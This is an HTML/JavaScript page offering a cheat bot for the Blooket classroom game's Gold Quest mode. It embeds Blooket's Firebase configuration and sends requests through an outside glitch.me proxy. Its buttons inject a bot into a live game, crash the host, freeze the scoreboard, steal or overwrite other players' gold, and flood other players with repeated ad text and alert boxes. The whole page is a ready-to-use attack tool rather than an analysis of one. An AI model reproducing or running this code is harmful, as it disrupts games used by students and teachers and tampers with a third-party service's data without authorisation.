<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blooket Bot â€“ Gold Quest Cheats</title>

    <!-- âœ… Correct Firebase CDN -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <style>
        /* ðŸŒ™ Dark Mode Styling */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            font-size: 2.5rem;
            color: #00ffc8;
            text-shadow: 0px 0px 20px rgba(0, 255, 200, 0.8);
            margin-bottom: 20px;
        }

        .input-container {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }

        input, button {
            padding: 12px;
            border-radius: 8px;
            border: none;
            font-size: 1rem;
            transition: 0.3s ease;
            outline: none;
        }

        input {
            background-color: #1e1e1e;
            color: #ffffff;
            border: 1px solid #444;
            width: 200px;
        }

        button {
            background-color: #00ffc8;
            color: #121212;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0px 4px 10px rgba(0, 255, 200, 0.4);
            transition: all 0.2s ease;
            margin-bottom: 10px;
        }

        button:hover {
            background-color: #00d4a8;
            transform: translateY(-2px);
            box-shadow: 0px 6px 12px rgba(0, 255, 200, 0.6);
        }

        .btn-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Blooket Bot â€“ Gold Quest Cheats</h1>

    <!-- ðŸŽ¯ Game Code Input -->
    <div class="input-container">
        <input type="text" id="gameCode" placeholder="Enter Game Code" />
        <input type="text" id="botName" placeholder="Enter Bot Name" />
    </div>

    <!-- âœ… Dedicated Join Button -->
    <div class="btn-container">
        <button onclick="joinBot()">Join Bot</button>
    </div>

    <!-- ðŸš€ Cheat Buttons -->
    <div class="btn-container">
        <button onclick="crashHost(this)">Crash Host</button>
        <button onclick="freezeScoreboard(this)">Freeze Scoreboard</button>
        <button onclick="stealGold()">Steal Gold From Player</button>
        <button onclick="setPlayerGold()">Set Player's Gold</button>
        <button onclick="setGold()">Set Gold</button>
        <button onclick="sendAdText()">Send Ad Text</button>
        <button onclick="floodAlertBox()">Flood Alert Box</button>
        <button onclick="leaveGame()">Leave Game</button>
    </div>

    <script>
        // âœ… Initialize Firebase (NO databaseURL)
        const firebaseConfig = {
            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
            authDomain: "blooket-2020.firebaseapp.com",
            projectId: "blooket-2020",
            storageBucket: "blooket-2020.appspot.com",
            messagingSenderId: "741533559105",
            appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
            measurementId: "G-S3H5NGN10Z"
        };

        firebase.initializeApp(firebaseConfig);

        let botName;
        let gameId;

        // âœ… Get Game Code and Bot Name
        function getGameInfo() {
            gameId = document.getElementById('gameCode').value;
            botName = document.getElementById('botName').value;
            if (!gameId || !botName) {
                alert("Please enter game code and bot name!");
                return false;
            }
            return true;
        }

        // âœ… JOIN BOT
        async function joinBot() {
            if (!getGameInfo()) return;

            try {
                const res = await fetch(`https://shard-uttermost-crystal.glitch.me/proxy/join`, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: gameId,
                        name: botName
                    })
                });

                const data = await res.json();
                if (!res.ok) throw new Error(data.error || "Failed to join");

                console.log("Bot joined:", data);
                alert("Bot joined the game successfully!");
            } catch (error) {
                console.error(`Error joining game: ${error.message}`);
                alert(`Error: ${error.message}`);
            }
        }

        // âœ… SEND REQUESTS THROUGH PROXY
        async function setUserVal(path, value) {
            if (!getGameInfo()) return;

            try {
                const res = await fetch(`https://shard-uttermost-crystal.glitch.me/proxy/join`, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: gameId,
                        name: botName,
                        path,
                        value
                    })
                });

                if (!res.ok) throw new Error(`Failed to update: ${res.statusText}`);
                console.log(`Updated: ${path} -> ${JSON.stringify(value)}`);
            } catch (error) {
                console.error(`Error sending request: ${error.message}`);
                alert(`Error: ${error.message}`);
            }
        }

        // âœ… Cheats (same as before)
        async function crashHost(button) {
            await setUserVal("g/t", "t");
            button.innerText = "Crashing";
        }

        async function freezeScoreboard(button) {
            button.frozen = !button.frozen;
            await setUserVal(button.frozen ? "tat/t" : "tat", "t");
            button.innerText = button.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
        }

        async function stealGold() {
            const target = prompt("Target player name:");
            const amount = prompt("Gold to steal:");
            await setUserVal("tat", `${target}:${amount}`);
        }

        async function setPlayerGold() {
            const target = prompt("Target player name:");
            const amount = prompt("Set gold to:");
            await setUserVal("tat", `${target}:swap:${amount}`);
        }

        async function setGold() {
            const gold = prompt("Set gold amount:");
            await setUserVal("g", gold);
        }

        async function sendAdText() {
            const target = prompt("Target player:");
            const text = prompt("Ad text:");
            await setUserVal("b", `Dog:${text.repeat(500)}`);
            await setUserVal("tat", `${target}:100`);
        }

        async function floodAlertBox() {
            const text = prompt("Flood text:");
            await setUserVal("tat", `${botName}:${Date.now()}${text.repeat(1700)}`);
        }

        async function leaveGame() {
            await setUserVal("", null);
        }
    </script>
</body>
</html>
